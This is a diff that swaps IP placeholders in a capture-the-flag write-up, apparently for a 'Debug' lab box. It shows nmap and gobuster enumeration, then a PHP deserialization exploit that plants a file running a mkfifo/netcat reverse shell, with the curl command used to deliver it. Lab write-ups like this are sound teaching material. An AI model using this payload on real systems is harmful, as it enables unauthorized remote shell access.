@@ -18,7 +18,7 @@ The task is to deploy the box, which we have already done. So click on **Complet
 
 First, let's do a basic nmap scan:
 ```shell
-nmap -Pn -A <machine_ip>
+nmap -Pn -A $MACHINE_IP
 ```
 
 ![](/images/v1per/Debug_1.png)
@@ -26,7 +26,7 @@ nmap -Pn -A <machine_ip>
 So, we get 2 open ports: **Port 22 (SSH)** and **Port 80 (HTTP)**
 
 We can see that there's a web-server open, so let's visit the website.
-**http://<machine_ip>:80**
+**http://$MACHINE_IP:80**
 
 ![](/images/v1per/Debug_2.png)
 
@@ -38,7 +38,7 @@ gobuster dir -u <box_ip> -w /usr/share/wordlists/dirb/common.txt -z -x html,txt,
 
 ![](/images/v1per/Debug_3.png)
 
-We find a **/backup** directory. Let's visit it: **http://<machine_ip>:80/backup**
+We find a **/backup** directory. Let's visit it: **http://$MACHINE_IP:80/backup**
 
 ![](/images/v1per/Debug_4.png)
 
@@ -52,13 +52,13 @@ Note that we also found a **/index.php** from gobuster. Visiting it, we see a Fo
 
 ![](/images/v1per/Debug_6.png)
 
-Filling it with arbitrary values and submitting it, we see that it gets displayed in **http://<machine_ip>:80/message.txt**, which is what the PHP file we found is doing. I wrote this PHP code for the attack (replace <your_tun0_IP> with, well, what it says):
+Filling it with arbitrary values and submitting it, we see that it gets displayed in **http://$MACHINE_IP:80/message.txt**, which is what the PHP file we found is doing. I wrote this PHP code for the attack (replace $your_tun0_IP with, well, what it says):
 
 ```php
 <?php
 class FormSubmit{
         public $form_file = 'lol.php';
-        public $message = '<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_tun0_IP> 1234 >/tmp/f"); ?>';
+        public $message = '<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $your_tun0_IP 1234 >/tmp/f"); ?>';
 }
 $obj = new FormSubmit();
 echo urlencode(serialize($obj));
@@ -74,10 +74,10 @@ php <your_php_file.php>
 
 Copy this output, and run the following command to upload our payload:
 ```shell
-curl -i http://<machine_ip>:80/index.php?debug=<copied_text>
+curl -i http://$MACHINE_IP:80/index.php?debug=<copied_text>
 ```
 or just visit the following website:
-**http://<machine_ip>:80/index.php?debug=<copied_text>**
+**http://$MACHINE_IP:80/index.php?debug=<copied_text>**
 
 ![](/images/v1per/Debug_8.png)
 
@@ -85,7 +85,7 @@ Now, let's set up a netcat listener on our terminal:
 ```shell
 nc -lnvp 1234
 ```
-and navigate to **http://<machine_ip>:80/lol.php**.
+and navigate to **http://$MACHINE_IP:80/lol.php**.
 And YAY! We have got our shell!
 
 ![](/images/v1per/Debug_9.png)
